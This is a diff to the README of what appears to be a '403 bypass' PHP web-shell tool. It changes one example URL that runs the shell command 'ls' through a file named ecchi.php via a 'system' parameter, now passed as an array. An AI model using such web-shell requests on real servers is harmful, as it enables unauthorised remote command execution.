@@ -1,6 +1,6 @@
 # 403-bypass-shell-use-range-function
 
-## Simple Usage
+## Example Usage
 ```
-http://target.com/ecchi.php?a=system&ecchi=ls
+http://target.com/ecchi.php?a=system&ecchi[]=ls
 ```
